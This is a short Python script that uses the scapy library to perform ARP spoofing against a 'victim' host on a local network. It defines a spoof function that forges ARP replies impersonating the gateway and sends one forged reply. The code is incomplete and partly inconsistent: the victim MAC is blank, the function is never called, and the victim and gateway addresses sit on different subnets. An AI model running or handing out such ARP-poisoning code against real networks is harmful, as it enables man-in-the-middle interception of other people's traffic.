from scapy.all import ARP, Ether, send
import time


target_ip = "192.168.43.121"        # IP of the victim
gateway_ip = "192.168.1.1"        # IP of the gateway (router)


target_mac = ""  # Replace with actual MAC of victim
gateway_mac = "11:22:33:44:55:66" # Replace with actual MAC of router

def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

print("Starting")
send(ARP(op=2, pdst="192.168.43.121", hwdst="00:00:00:00:00:00"), verbose=False)